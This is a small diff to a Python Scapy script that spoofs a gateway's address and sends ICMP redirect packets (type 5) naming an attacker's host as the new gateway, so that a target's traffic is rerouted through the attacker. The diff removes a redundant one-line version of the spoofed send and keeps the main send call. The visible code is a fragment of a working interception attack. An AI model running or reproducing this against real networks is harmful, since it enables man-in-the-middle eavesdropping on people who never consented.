@@ -18,6 +18,7 @@ args = parser.parse_args()
 ip     = IP()
 ip.src = args.gateway
 ip.dst = args.target
+
 # https://datatracker.ietf.org/doc/html/rfc792
 #    0                   1                   2                   3
 #    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
@@ -48,7 +49,3 @@ ip_payload.dst = args.destination
 udp = UDP()
 
 send(ip/icmp/ip_payload/udp)
-
-
-
-send(IP(src=args.gateway, dst=args.target)/ICMP(type=5, code=args.redirect_code, gw=args.attacker)/IP(src=args.target, dst=args.destination)/UDP())
